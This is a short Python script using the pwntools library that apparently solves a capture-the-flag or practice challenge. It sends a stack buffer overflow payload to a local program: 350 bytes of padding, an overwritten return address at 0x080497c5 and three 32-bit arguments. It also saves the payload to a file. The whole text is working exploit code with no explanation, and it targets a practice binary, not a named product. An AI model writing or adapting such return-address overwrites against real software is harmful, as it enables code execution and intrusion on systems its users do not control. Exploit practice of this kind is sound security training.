from pwn import *

context.binary = "./binary"
conn = process("./binary")

payload = b"A" * 350
payload += p32(0x080497c5)
payload += b"A" * 4
payload += p32(347)
payload += p32(1)
payload += p32(87)

conn.recv(4096)
conn.sendline(payload)
print(conn.recvuntil(b"O"))

open("fun_or_profit.txt", "w+b").write(payload)
